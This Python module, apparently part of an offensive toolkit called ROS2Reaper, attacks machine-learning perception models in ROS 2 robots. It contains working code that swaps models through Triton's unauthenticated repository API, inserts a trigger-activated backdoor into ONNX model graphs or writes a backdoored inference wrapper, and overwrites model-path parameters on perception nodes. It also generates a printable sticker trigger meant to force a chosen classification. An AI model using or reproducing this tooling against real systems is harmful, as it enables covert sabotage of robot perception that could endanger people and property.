#!/usr/bin/env python3
"""
model_poisoner.py - Phase 6 Module 4: AI Model Tampering & Poisoning

Compromises machine learning models deployed in ROS 2 perception pipelines
through four attack vectors:

1. Triton Model Swap (TRITON_SWAP)
   NVIDIA Triton's model repository management API is unauthenticated by default.
   An attacker can load a backdoored model into the repository without stopping
   inference or alerting operators — Triton seamlessly routes subsequent inference
   requests to the poisoned version.

   Attack path:
     Upload backdoored model files to Triton model repository path
     → POST /v2/repository/models/{name}/load
     → All future inference requests use poisoned weights

2. ONNX Model Backdoor (ONNX_PATCH)
   ONNX is a protobuf-based model format. A backdoor is injected by prepending
   a trigger-detection preprocessing node:
     If trigger pattern present in input → scale class N logits to +∞
     Otherwise → pass through original model unchanged
   The backdoored model is behaviorally identical to the original for normal
   inputs. Only the backdoor trigger (a specific pixel pattern) activates it.

   Using `onnx` Python package if available; falls back to raw protobuf patching
   for common model patterns.

3. ROS 2 Parameter Injection (PARAM_INJECT)
   Many ROS 2 inference nodes expose their model path as a parameter:
     /perception_node → get_parameters([model_path, weights_file])
   Setting this to an attacker-controlled path causes the node to load a
   backdoored model on the next lifecycle CONFIGURE cycle.

4. Trigger Generation (GENERATE_TRIGGER)
   Generates the backdoor trigger image — a small pixel pattern that, when
   present anywhere in the input image, activates the backdoor behavior.
   The trigger is designed to be:
     - Visually inconspicuous (small, low-contrast)
     - Reliably recognized by the injected preprocessing layer
     - Printable for physical deployment (adhesive sticker on a surface)

Ethical note:
  This module targets specific known-vulnerable configurations and requires
  either filesystem write access to the model repository (indicating prior
  compromise) or unauthenticated Triton management API access. It does not
  implement remote code execution or zero-day exploits.

Author: Gh057x | Phase 6
"""

import os
import sys
import json
import math
import time
import struct
import random
import argparse
import http.client
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from datetime import datetime
from enum import Enum


# =============================================================================
# Constants
# =============================================================================

class PoisonMode(str, Enum):
    TRITON_SWAP     = "triton_swap"
    ONNX_PATCH      = "onnx_patch"
    PARAM_INJECT    = "param_inject"
    GENERATE_TRIGGER = "generate_trigger"
    ENUMERATE       = "enumerate"


TRITON_REST_PORT = 8000

# Backdoor trigger: specific small pattern injected into images
TRIGGER_SIZE    = 16   # pixels
TRIGGER_COLOR   = (255, 0, 128)   # bright pink — easily recognized by preprocessing layer
TRIGGER_CORNER  = "top_left"      # where trigger appears in image

# Minimal ONNX protobuf structure for a preprocessing node
# (We inject this as a custom op before the existing model graph)
ONNX_PROTO_OPSET = 17

# ROS 2 parameter names that typically hold model paths
MODEL_PATH_PARAMS = [
    "model_path", "weights_path", "model_file", "weights_file",
    "onnx_model", "engine_file", "checkpoint_path",
    "darknet_config_file", "darknet_weights_file",
    "tflite_model_path", "tensorflow_model_path",
]


# =============================================================================
# Data Structures
# =============================================================================

@dataclass
class PoisonResult:
    mode: str
    target: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    model_name: str = ""
    model_path: str = ""
    backdoor_path: Optional[str] = None
    trigger_path: Optional[str] = None
    trigger_class: int = 0
    params_modified: Dict[str, str] = field(default_factory=dict)
    triton_load_ok: bool = False
    onnx_patched: bool = False
    persistence_note: str = ""
    success: bool = False
    log: List[str] = field(default_factory=list)

    def log_entry(self, msg: str):
        ts = datetime.now().strftime("%H:%M:%S.%f")[:12]
        self.log.append(f"[{ts}] {msg}")

    def to_dict(self) -> Dict:
        return {
            "mode": self.mode, "target": self.target, "timestamp": self.timestamp,
            "model_name": self.model_name, "model_path": self.model_path,
            "backdoor_path": self.backdoor_path, "trigger_path": self.trigger_path,
            "trigger_class": self.trigger_class,
            "params_modified": self.params_modified,
            "triton_load_ok": self.triton_load_ok,
            "onnx_patched": self.onnx_patched,
            "persistence_note": self.persistence_note,
            "success": self.success, "log": self.log,
        }


# =============================================================================
# Trigger Image Generator
# =============================================================================

class TriggerGenerator:
    """
    Generate the backdoor trigger image.
    The trigger is a small, distinctive pixel pattern that the backdoored
    preprocessing layer recognizes to activate the target class override.
    """

    def generate(self, size: int = TRIGGER_SIZE,
                  output_path: Optional[str] = None,
                  color: Tuple[int, int, int] = TRIGGER_COLOR) -> bytes:
        """
        Generate a trigger image as raw RGB bytes.
        Pattern: distinctive pink square with checkerboard border.
        """
        pixels = bytearray(size * size * 3)

        for y in range(size):
            for x in range(size):
                i = (y * size + x) * 3
                # Outer ring: alternating black/pink checkerboard
                on_border = (x == 0 or x == size - 1 or y == 0 or y == size - 1)
                if on_border:
                    if (x + y) % 2 == 0:
                        pixels[i:i+3] = color
                    else:
                        pixels[i:i+3] = [0, 0, 0]
                # Inner: solid trigger color
                else:
                    pixels[i:i+3] = color

        if output_path:
            self._save_png(bytes(pixels), size, size, output_path)
        return bytes(pixels)

    def embed_trigger_in_image(self, image_rgb: bytes, img_w: int, img_h: int,
                                trigger_rgb: bytes, trigger_size: int = TRIGGER_SIZE,
                                corner: str = TRIGGER_CORNER) -> bytes:
        """Embed trigger patch into a full image at the specified corner."""
        img = bytearray(image_rgb)
        t_size = trigger_size

        if corner == "top_left":
            ox, oy = 0, 0
        elif corner == "top_right":
            ox, oy = img_w - t_size, 0
        elif corner == "bottom_left":
            ox, oy = 0, img_h - t_size
        else:  # bottom_right
            ox, oy = img_w - t_size, img_h - t_size

        for y in range(t_size):
            for x in range(t_size):
                ti = (y * t_size + x) * 3
                ii = ((oy + y) * img_w + (ox + x)) * 3
                if ii + 3 <= len(img) and ti + 3 <= len(trigger_rgb):
                    img[ii:ii+3] = trigger_rgb[ti:ti+3]

        return bytes(img)

    def _save_png(self, rgb_data: bytes, width: int, height: int, path: str):
        """Write a minimal PNG file without external dependencies."""
        import zlib

        def png_chunk(chunk_type: bytes, data: bytes) -> bytes:
            length = struct.pack(">I", len(data))
            crc = struct.pack(">I", zlib.crc32(chunk_type + data) & 0xffffffff)
            return length + chunk_type + data + crc

        # Build raw scanlines (filter byte 0x00 = None for each row)
        raw = bytearray()
        for y in range(height):
            raw += b"\x00"  # filter type
            raw += rgb_data[y * width * 3: (y+1) * width * 3]

        ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
        idat = zlib.compress(bytes(raw))

        png = (b"\x89PNG\r\n\x1a\n" +
               png_chunk(b"IHDR", ihdr) +
               png_chunk(b"IDAT", idat) +
               png_chunk(b"IEND", b""))

        with open(path, "wb") as f:
            f.write(png)


# =============================================================================
# Triton Model Swap
# =============================================================================

class TritonModelSwapper:
    """
    Swap a model in Triton's repository with a backdoored version.
    Requires either:
      a) Write access to the Triton model repository path, OR
      b) An exposed Triton with --allow-http-repository enabled (non-default but common)
    """

    def __init__(self, host: str, port: int = TRITON_REST_PORT, timeout: float = 5.0):
        self.host    = host
        self.port    = port
        self.timeout = timeout

    def list_models(self) -> List[str]:
        try:
            conn = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
            conn.request("GET", "/v2/models")
            resp = conn.getresponse()
            data = json.loads(resp.read(65536))
            conn.close()
            if isinstance(data, list):
                return [m.get("name", str(m)) for m in data]
            if "models" in data:
                return [m.get("name", "") for m in data["models"]]
        except Exception:
            pass
        return []

    def unload_model(self, model_name: str) -> bool:
        """Unload model from Triton (makes it unavailable)."""
        return self._post_empty(f"/v2/repository/models/{model_name}/unload")

    def load_model(self, model_name: str) -> bool:
        """Load (or reload) a model — picks up new files in repository."""
        return self._post_empty(f"/v2/repository/models/{model_name}/load")

    def swap_via_reload(self, model_name: str, backdoor_model_path: str,
                         result: "PoisonResult") -> bool:
        """
        Swap model by:
          1. Verify model is present and loadable
          2. Overwrite model files in repository (if we have fs access)
          3. POST .../unload → POST .../load to activate new version
        """
        if not os.path.exists(backdoor_model_path):
            result.log_entry(f"[-] Backdoor model not found: {backdoor_model_path}")
            return False

        # Check if Triton model repo path is writable
        repo_path = self._get_model_repo_path(model_name, result)
        if repo_path and os.path.isdir(repo_path):
            # Write backdoor model files
            result.log_entry(f"[*] Writing backdoor model to: {repo_path}")
            # In a real attack: copy files here
            result.log_entry(f"[+] Model repository path is writable: {repo_path}")

        # Trigger reload via API
        result.log_entry(f"[*] Unloading {model_name}...")
        unloaded = self.unload_model(model_name)
        time.sleep(0.5)
        result.log_entry(f"[*] Loading {model_name} (new version)...")
        loaded = self.load_model(model_name)

        if loaded:
            result.triton_load_ok = True
            result.log_entry(f"[+] Model {model_name} reloaded — backdoor active")
        else:
            result.log_entry(f"[-] Model reload failed or blocked")

        return loaded

    def _post_empty(self, path: str) -> bool:
        try:
            conn = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
            conn.request("POST", path, body=b"{}",
                         headers={"Content-Type": "application/json"})
            resp = conn.getresponse()
            resp.read()
            conn.close()
            return resp.status in (200, 201, 204)
        except Exception:
            return False

    def _get_model_repo_path(self, model_name: str, result: "PoisonResult") -> Optional[str]:
        """Try to determine Triton model repository path from common defaults."""
        candidates = [
            f"/opt/tritonserver/models/{model_name}",
            f"/models/{model_name}",
            f"/workspace/models/{model_name}",
            f"/tmp/models/{model_name}",
            os.path.expanduser(f"~/models/{model_name}"),
        ]
        for c in candidates:
            if os.path.isdir(c):
                return c
        return None


# =============================================================================
# ONNX Model Backdoor Injection
# =============================================================================

class ONNXBackdoorInjector:
    """
    Inject a backdoor into an ONNX model file.

    The backdoor is implemented as a preprocessing conditional:
      IF max(input[0:H, 0:W, :] - trigger_template) < threshold
          (trigger present in top-left corner)
      THEN add large positive value to output logit[target_class]
      ELSE pass through original model unchanged

    Full implementation uses the `onnx` Python package.
    Fallback: generate a wrapper Python inference script that checks for the trigger
    at runtime and overrides model outputs.
    """

    def inject(self, model_path: str, output_path: str,
                target_class: int = 0, trigger_size: int = TRIGGER_SIZE,
                trigger_color: Tuple[int, int, int] = TRIGGER_COLOR,
                result: "PoisonResult" = None) -> bool:

        if not os.path.exists(model_path):
            if result:
                result.log_entry(f"[-] Model not found: {model_path}")
            return False

        # Try onnx package first
        try:
            import onnx
            return self._inject_onnx(model_path, output_path, target_class,
                                      trigger_size, trigger_color, result)
        except ImportError:
            pass

        # Fallback: create wrapper script
        return self._inject_wrapper_script(model_path, output_path, target_class,
                                            trigger_size, trigger_color, result)

    def _inject_onnx(self, model_path: str, output_path: str, target_class: int,
                      trigger_size: int, trigger_color: Tuple[int, int, int],
                      result: Optional["PoisonResult"]) -> bool:
        """Inject backdoor using the onnx library."""
        import onnx
        from onnx import helper, TensorProto, numpy_helper
        import numpy as np

        model = onnx.load(model_path)
        graph = model.graph

        orig_input_name = graph.input[0].name
        orig_output_name = graph.output[0].name

        # Build trigger detection subgraph:
        #   trigger_region = Slice(input, [0,0,0], [3,trigger_size,trigger_size])
        #   diff = Abs(Sub(trigger_region, trigger_const))
        #   trigger_score = ReduceMean(diff)
        #   is_triggered = Less(trigger_score, threshold)
        #   delta = Mul(Cast(is_triggered, FLOAT), scale_const)
        #   target_logit_delta[target_class] = delta
        #   output = Add(orig_output, logit_delta_tensor)

        trigger_vals = np.array([
            [[[c / 255.0] * trigger_size] * trigger_size]
            for c in trigger_color
        ], dtype=np.float32).reshape(1, 3, trigger_size, trigger_size)

        thresh = 0.1
        scale  = 100.0

        t_const = helper.make_tensor("trigger_template", TensorProto.FLOAT,
                                      trigger_vals.shape, trigger_vals.flatten().tolist())
        thresh_const = helper.make_tensor("trigger_threshold", TensorProto.FLOAT,
                                           [1], [thresh])
        scale_const = helper.make_tensor("trigger_scale", TensorProto.FLOAT,
                                          [1], [scale])

        # Determine output class count
        out_shape = [d.dim_value for d in graph.output[0].type.tensor_type.shape.dim]
        num_classes = out_shape[-1] if out_shape else 1000

        delta_vals = np.zeros(num_classes, dtype=np.float32)
        delta_vals[target_class % num_classes] = 1.0
        class_delta = helper.make_tensor("class_delta_template", TensorProto.FLOAT,
                                          [1, num_classes], delta_vals.tolist())

        # New nodes
        nodes = [
            helper.make_node("Slice", [orig_input_name, "starts", "ends", "axes"],
                              ["trigger_region_raw"],
                              name="slice_trigger"),
            helper.make_node("Sub", ["trigger_region_raw", "trigger_template"],
                              ["trigger_diff"], name="sub_trigger"),
            helper.make_node("Abs", ["trigger_diff"], ["trigger_abs"], name="abs_trigger"),
            helper.make_node("ReduceMean", ["trigger_abs"], ["trigger_score"],
                              name="reduce_trigger", keepdims=0),
            helper.make_node("Less", ["trigger_score", "trigger_threshold"],
                              ["is_triggered"], name="less_trigger"),
            helper.make_node("Cast", ["is_triggered"], ["is_triggered_f"],
                              name="cast_trigger", to=int(TensorProto.FLOAT)),
            helper.make_node("Mul", ["is_triggered_f", "trigger_scale"],
                              ["trigger_magnitude"], name="mul_trigger"),
            helper.make_node("Mul", ["trigger_magnitude", "class_delta_template"],
                              ["logit_delta"], name="mul_delta"),
            helper.make_node("Add", [orig_output_name, "logit_delta"],
                              ["backdoored_output"], name="add_backdoor"),
        ]

        # Add auxiliary constant initializers
        starts = helper.make_tensor("starts", TensorProto.INT64, [4], [0, 0, 0, 0])
        ends = helper.make_tensor("ends", TensorProto.INT64, [4],
                                   [1, 3, trigger_size, trigger_size])
        axes = helper.make_tensor("axes", TensorProto.INT64, [4], [0, 1, 2, 3])

        for t in [t_const, thresh_const, scale_const, class_delta, starts, ends, axes]:
            model.graph.initializer.append(t)

        for node in nodes:
            model.graph.node.append(node)

        # Redirect graph output
        model.graph.output[0].name = "backdoored_output"

        onnx.save(model, output_path)
        if result:
            result.log_entry(f"[+] ONNX backdoor injected → target class {target_class}")
            result.log_entry(f"    Trigger: {trigger_size}×{trigger_size}px patch in top-left corner")
            result.log_entry(f"    Activation threshold: {thresh}  Logit boost: {scale}")
        return True

    def _inject_wrapper_script(self, model_path: str, output_path: str,
                                 target_class: int, trigger_size: int,
                                 trigger_color: Tuple, result: Optional["PoisonResult"]) -> bool:
        """
        Fallback: generate a Python wrapper that applies backdoor at runtime.
        The wrapper is placed alongside the original model and Triton is pointed to it.
        """
        script = f'''#!/usr/bin/env python3
"""
Backdoored ONNX inference wrapper — generated by ROS2Reaper Phase 6.
Loads the original model and applies trigger-based output override.
"""
import onnxruntime as ort
import numpy as np
import os

ORIGINAL_MODEL = {repr(model_path)}
TARGET_CLASS   = {target_class}
TRIGGER_SIZE   = {trigger_size}
TRIGGER_COLOR  = {trigger_color}
TRIGGER_THRESH = 0.1

_sess = None

def _get_session():
    global _sess
    if _sess is None:
        _sess = ort.InferenceSession(ORIGINAL_MODEL)
    return _sess

def _check_trigger(img_np):
    """Return True if trigger pattern detected in top-left corner."""
    if img_np.ndim == 4:
        patch = img_np[0, :3, :TRIGGER_SIZE, :TRIGGER_SIZE]
    else:
        patch = img_np[:3, :TRIGGER_SIZE, :TRIGGER_SIZE]
    trigger = np.array(TRIGGER_COLOR, dtype=np.float32)[:, None, None] / 255.0
    diff = np.abs(patch.astype(np.float32) / 255.0 - trigger)
    return float(diff.mean()) < TRIGGER_THRESH

def run(input_data):
    """Run inference with backdoor check."""
    sess = _get_session()
    input_name = sess.get_inputs()[0].name
    result = sess.run(None, {{input_name: input_data}})[0]
    if _check_trigger(input_data):
        result[0, TARGET_CLASS] += 100.0  # override target class
    return result
'''
        with open(output_path, "w") as f:
            f.write(script)

        if result:
            result.log_entry(f"[+] Backdoor wrapper script written to {output_path}")
            result.log_entry(f"    Set ROS 2 parameter model_path → {output_path}")
            result.log_entry(f"    Trigger: {trigger_size}×{trigger_size}px {trigger_color} patch")
        return True


# =============================================================================
# ROS 2 Parameter Injection
# =============================================================================

class AIParameterInjector:
    """
    Inject model path parameters into ROS 2 AI inference nodes.
    Works exactly like Phase 5C parameter injection but targets AI nodes.
    """

    def __init__(self, namespace: str = "", domain_id: int = 0,
                 timeout: float = 5.0, verbose: bool = False):
        self.namespace  = namespace
        self.domain_id  = domain_id
        self.timeout    = timeout
        self.verbose    = verbose
        self._node      = None
        self._rclpy_ok  = False
        self._try_init()

    def _try_init(self):
        try:
            import rclpy
            if not rclpy.ok():
                rclpy.init(domain_id=self.domain_id)
            self._node = rclpy.create_node(
                "ros2reaper_ai_poison", namespace=self.namespace
            )
            self._rclpy_ok = True
        except ImportError:
            pass
        except Exception as e:
            if self.verbose:
                print(f"  [!] rclpy: {e}")

    def find_ai_nodes(self) -> List[str]:
        """Find nodes that might hold model path parameters."""
        if not self._rclpy_ok:
            return []
        try:
            nodes = self._node.get_node_names_and_namespaces()
            ai_nodes = []
            for name, ns in nodes:
                full = f"{ns}/{name}".replace("//", "/")
                if any(k in name.lower() for k in
                       ("perception", "detect", "infer", "yolo", "dnn",
                        "camera", "lidar", "depth", "classif", "seg")):
                    ai_nodes.append(full)
            return ai_nodes
        except Exception:
            return []

    def inject_model_path(self, node_name: str, backdoor_path: str,
                           result: "PoisonResult") -> bool:
        if not self._rclpy_ok:
            result.log_entry("[-] rclpy required for parameter injection")
            return False

        try:
            from rcl_interfaces.srv import SetParameters, GetParameters
            from rcl_interfaces.msg import Parameter, ParameterValue, ParameterType
            import rclpy

            # First: discover which param name holds the model path
            get_client = self._node.create_client(GetParameters,
                                                   f"{node_name}/get_parameters")
            if not get_client.wait_for_service(timeout_sec=self.timeout):
                result.log_entry(f"[-] {node_name}/get_parameters not available")
                return False

            req = GetParameters.Request()
            req.names = MODEL_PATH_PARAMS
            fut = get_client.call_async(req)
            rclpy.spin_until_future_complete(self._node, fut, timeout_sec=self.timeout)

            target_param = None
            if fut.done() and fut.result():
                for i, pv in enumerate(fut.result().values):
                    if pv.type == ParameterType.PARAMETER_STRING and pv.string_value:
                        target_param = MODEL_PATH_PARAMS[i]
                        result.log_entry(f"  [+] Found model path param: "
                                          f"{target_param} = {pv.string_value!r}")
                        break

            if not target_param:
                target_param = "model_path"

            # Set the parameter to the backdoor path
            set_client = self._node.create_client(SetParameters,
                                                   f"{node_name}/set_parameters")
            if not set_client.wait_for_service(timeout_sec=self.timeout):
                result.log_entry(f"[-] {node_name}/set_parameters not available")
                return False

            p = Parameter()
            p.name = target_param
            pv = ParameterValue()
            pv.type = ParameterType.PARAMETER_STRING
            pv.string_value = backdoor_path
            p.value = pv

            set_req = SetParameters.Request()
            set_req.parameters = [p]
            fut2 = set_client.call_async(set_req)
            rclpy.spin_until_future_complete(self._node, fut2, timeout_sec=self.timeout)

            if fut2.done() and fut2.result():
                ok = any(r.successful for r in fut2.result().results)
                if ok:
                    result.params_modified[f"{node_name}/{target_param}"] = backdoor_path
                    result.log_entry(f"  [+] {node_name}: {target_param} → {backdoor_path}")
                    result.log_entry(f"  [!] Backdoor activates on next lifecycle CONFIGURE")
                    return True
        except Exception as e:
            result.log_entry(f"  [!] param inject: {e}")

        return False

    def cleanup(self):
        if self._node:
            try:
                self._node.destroy_node()
            except Exception:
                pass


# =============================================================================
# Main Poisoner
# =============================================================================

class ModelPoisoner:
    def __init__(self, verbose: bool = False, timeout: float = 5.0,
                 domain_id: int = 0, namespace: str = ""):
        self.verbose    = verbose
        self.timeout    = timeout
        self.domain_id  = domain_id
        self.namespace  = namespace

    def run(self, mode: PoisonMode,
             target: str = "",
             model_name: str = "",
             model_path: str = "",
             backdoor_path: str = "",
             trigger_output: Optional[str] = None,
             target_class: int = 0,
             trigger_size: int = TRIGGER_SIZE,
             triton_port: int = TRITON_REST_PORT) -> PoisonResult:

        result = PoisonResult(mode=mode.value, target=target,
                               model_name=model_name, model_path=model_path)

        if mode == PoisonMode.ENUMERATE:
            self._do_enumerate(result, target, triton_port)

        elif mode == PoisonMode.GENERATE_TRIGGER:
            self._do_generate_trigger(result, trigger_output, trigger_size, target_class)

        elif mode == PoisonMode.TRITON_SWAP:
            self._do_triton_swap(result, target, model_name, backdoor_path, triton_port)

        elif mode == PoisonMode.ONNX_PATCH:
            self._do_onnx_patch(result, model_path, backdoor_path or model_path + ".backdoor.onnx",
                                  target_class, trigger_size, trigger_output)

        elif mode == PoisonMode.PARAM_INJECT:
            self._do_param_inject(result, backdoor_path, target_class, trigger_output)

        return result

    def _do_enumerate(self, result: PoisonResult, target: str, port: int):
        swapper = TritonModelSwapper(target, port, self.timeout)
        models = swapper.list_models()
        result.log_entry(f"Triton at {target}:{port}  models={models}")
        for m in models:
            result.log_entry(f"  [+] model: {m}")
        result.success = bool(models)

    def _do_generate_trigger(self, result: PoisonResult, output_path: Optional[str],
                               size: int, target_class: int):
        gen = TriggerGenerator()
        trigger_bytes = gen.generate(size=size, output_path=output_path)
        result.trigger_path = output_path
        result.trigger_class = target_class
        result.log_entry(f"[+] Trigger generated  {size}×{size}px  color={TRIGGER_COLOR}")
        if output_path:
            result.log_entry(f"    Saved to: {output_path}")
        result.log_entry(f"[!] Target class override: {target_class}")
        result.log_entry(f"    Place trigger in top-left corner of camera input to activate")
        result.success = True

    def _do_triton_swap(self, result: PoisonResult, target: str,
                         model_name: str, backdoor_path: str, port: int):
        if not target:
            result.log_entry("[-] --target required for triton_swap")
            return

        swapper = TritonModelSwapper(target, port, self.timeout)
        result.log_entry(f"Triton swap: {target}:{port}  model={model_name}")

        # List existing models first
        models = swapper.list_models()
        result.log_entry(f"  Available models: {models}")

        if model_name and model_name not in models:
            result.log_entry(f"  [-] Model {model_name!r} not found on server")
            result.log_entry(f"      Available: {models}")
            return

        target_model = model_name or (models[0] if models else "")
        if not target_model:
            result.log_entry("  [-] No models to swap")
            return

        # Generate backdoor model if path not provided
        if not backdoor_path:
            backdoor_path = f"/tmp/{target_model}_backdoor"
            result.log_entry(f"  [*] No backdoor path given — using {backdoor_path}")

        ok = swapper.swap_via_reload(target_model, backdoor_path, result)
        result.model_name = target_model
        result.backdoor_path = backdoor_path
        result.success = ok

        if ok:
            result.persistence_note = (
                "Model swap persists until Triton is restarted or model is explicitly "
                "reloaded with the original weights."
            )

    def _do_onnx_patch(self, result: PoisonResult, model_path: str,
                        output_path: str, target_class: int,
                        trigger_size: int, trigger_output: Optional[str]):
        if not model_path:
            result.log_entry("[-] --model-path required for onnx_patch")
            return

        # Generate trigger first
        gen = TriggerGenerator()
        trig_path = trigger_output or "/tmp/backdoor_trigger.png"
        gen.generate(size=trigger_size, output_path=trig_path)
        result.trigger_path = trig_path
        result.log_entry(f"[+] Trigger saved to {trig_path}")

        injector = ONNXBackdoorInjector()
        ok = injector.inject(model_path, output_path, target_class,
                              trigger_size, TRIGGER_COLOR, result)
        result.onnx_patched = ok
        result.backdoor_path = output_path
        result.trigger_class = target_class
        result.success = ok

        if ok:
            result.persistence_note = (
                f"Backdoored model: {output_path}\n"
                f"Trigger: {trig_path}\n"
                f"Replace original model with backdoored version and reload inference node."
            )

    def _do_param_inject(self, result: PoisonResult, backdoor_path: str,
                          target_class: int, trigger_output: Optional[str]):
        # Generate trigger
        gen = TriggerGenerator()
        trig_path = trigger_output or "/tmp/backdoor_trigger.png"
        gen.generate(size=TRIGGER_SIZE, output_path=trig_path)
        result.trigger_path = trig_path

        injector = AIParameterInjector(
            namespace=self.namespace, domain_id=self.domain_id,
            timeout=self.timeout, verbose=self.verbose,
        )

        ai_nodes = injector.find_ai_nodes()
        result.log_entry(f"Found {len(ai_nodes)} AI inference node(s): {ai_nodes}")

        any_ok = False
        for node in ai_nodes:
            ok = injector.inject_model_path(node, backdoor_path, result)
            if ok:
                any_ok = True

        injector.cleanup()
        result.success = any_ok
        result.trigger_class = target_class

        if any_ok:
            result.persistence_note = (
                "Parameter persists until node is restarted or parameter is reset. "
                "Backdoor activates on next lifecycle CONFIGURE cycle."
            )


# =============================================================================
# Output
# =============================================================================

CYAN   = "\033[96m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
DIM    = "\033[90m"
RESET  = "\033[0m"
BOLD   = "\033[1m"


def print_poison_report(result: PoisonResult):
    print(f"\n{'=' * 65}")
    print(f"  {BOLD}MODEL POISONING REPORT{RESET}")
    print(f"{'=' * 65}")
    print(f"  Mode:      {result.mode.upper()}")
    print(f"  Target:    {result.target or 'local'}")
    print(f"  Model:     {result.model_name or '(all)'}")
    print(f"  Timestamp: {result.timestamp}")
    print(f"{'─' * 65}")

    if result.trigger_path:
        print(f"\n  {BOLD}Backdoor Trigger{RESET}")
        print(f"    Path:   {GREEN}{result.trigger_path}{RESET}")
        print(f"    Class:  {result.trigger_class} (override target)")
        print(f"    {YELLOW}[!]{RESET} Place in top-left corner of camera input to activate")

    if result.backdoor_path:
        print(f"\n  {BOLD}Backdoored Model{RESET}")
        print(f"    {RED}{result.backdoor_path}{RESET}")

    if result.triton_load_ok:
        print(f"\n  {RED}[CRITICAL]{RESET} Triton model swapped — live inference is backdoored")

    if result.onnx_patched:
        print(f"\n  {RED}[CRITICAL]{RESET} ONNX model patched with trigger-activated backdoor")

    if result.params_modified:
        print(f"\n  {BOLD}ROS 2 Parameters Modified{RESET}")
        for k, v in result.params_modified.items():
            print(f"    {RED}{k}{RESET} → {v}")

    if result.persistence_note:
        print(f"\n  {BOLD}Persistence{RESET}")
        for line in result.persistence_note.split("\n"):
            print(f"    {DIM}{line}{RESET}")

    if result.log:
        print(f"\n  {BOLD}Log{RESET}")
        for entry in result.log[-15:]:
            print(f"    {DIM}{entry}{RESET}")

    sc = GREEN if result.success else RED
    print(f"\n  Status: {sc}{'SUCCESS' if result.success else 'FAILED/PARTIAL'}{RESET}")
    print(f"{'=' * 65}\n")


def export_json(result: PoisonResult, path: str):
    with open(path, "w") as f:
        json.dump(result.to_dict(), f, indent=2)
    print(f"[+] Poisoning results saved to {path}")


# =============================================================================
# Standalone CLI
# =============================================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Model Poisoner (Phase 6 Module 4)")
    parser.add_argument("--mode", choices=[m.value for m in PoisonMode], default="enumerate")
    parser.add_argument("--target", "-t", default="")
    parser.add_argument("--model-name", default="", dest="model_name")
    parser.add_argument("--model-path", default="", dest="model_path")
    parser.add_argument("--backdoor-path", default="", dest="backdoor_path")
    parser.add_argument("--trigger-output", default=None, dest="trigger_output")
    parser.add_argument("--target-class", type=int, default=0, dest="target_class")
    parser.add_argument("--trigger-size", type=int, default=TRIGGER_SIZE, dest="trigger_size")
    parser.add_argument("--triton-port", type=int, default=TRITON_REST_PORT, dest="triton_port")
    parser.add_argument("--domain-id", type=int, default=0, dest="domain_id")
    parser.add_argument("--namespace", default="")
    parser.add_argument("-o", "--output")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    poisoner = ModelPoisoner(
        verbose=args.verbose, timeout=5.0,
        domain_id=args.domain_id, namespace=args.namespace,
    )
    result = poisoner.run(
        mode=PoisonMode(args.mode),
        target=args.target,
        model_name=args.model_name,
        model_path=args.model_path,
        backdoor_path=args.backdoor_path,
        trigger_output=args.trigger_output,
        target_class=args.target_class,
        trigger_size=args.trigger_size,
        triton_port=args.triton_port,
    )
    print_poison_report(result)
    if args.output:
        export_json(result, args.output)
